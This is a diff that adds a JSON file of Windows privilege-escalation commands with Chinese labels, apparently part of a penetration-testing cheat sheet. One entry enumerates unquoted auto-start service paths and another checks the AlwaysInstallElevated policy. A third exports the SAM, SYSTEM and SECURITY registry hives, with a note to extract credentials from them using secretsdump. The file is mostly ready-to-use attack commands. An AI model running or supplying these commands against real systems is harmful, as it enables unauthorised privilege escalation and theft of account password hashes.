@@ -1,0 +1,26 @@
+[
+  {
+    "id": "k-7",
+    "category": "Windows 提权",
+    "os": "Windows",
+    "title": "服务权限与未引用路径",
+    "cmd": "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\\\\\"",
+    "note": ""
+  },
+  {
+    "id": "k-8",
+    "category": "Windows 提权",
+    "os": "Windows",
+    "title": "AlwaysInstallElevated 检查",
+    "cmd": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated & reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
+    "note": ""
+  },
+  {
+    "id": "k-9",
+    "category": "Windows 提权",
+    "os": "Windows",
+    "title": "凭据提取（SAM / LSA）",
+    "cmd": "reg save HKLM\\SAM sam.hiv & reg save HKLM\\SYSTEM system.hiv & reg save HKLM\\SECURITY security.hiv",
+    "note": "导出后本地用 secretsdump 解析"
+  }
+]
